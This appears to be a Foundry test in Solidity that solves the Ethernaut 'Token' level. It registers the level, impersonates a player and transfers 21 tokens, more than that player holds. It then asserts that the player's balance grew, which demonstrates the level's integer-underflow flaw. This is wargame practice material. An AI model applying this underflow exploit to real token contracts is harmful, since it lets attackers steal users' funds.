pragma solidity ^0.8.19;

import "ds-test/test.sol";
import "../../src/Token/TokenFactory.sol";
import "../../src/Ethernaut.sol";
import "../../src/test/utils/vm.sol";
// import "../../src/Token/NothingToSee.sol";

contract TokenTestz is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    Token token;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testToken() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));
        // attack
        uint256 prevBal = ethernautToken.balanceOf(eoaAddress);
        emit log_named_uint("balance of attacker before attack", ethernautToken.balanceOf(eoaAddress));
        ethernautToken.transfer(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D), 21);
        emit log_named_uint("balance of attacker after attack", ethernautToken.balanceOf(eoaAddress));
        assertGt(ethernautToken.balanceOf(eoaAddress), prevBal);
        // submit level instance
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
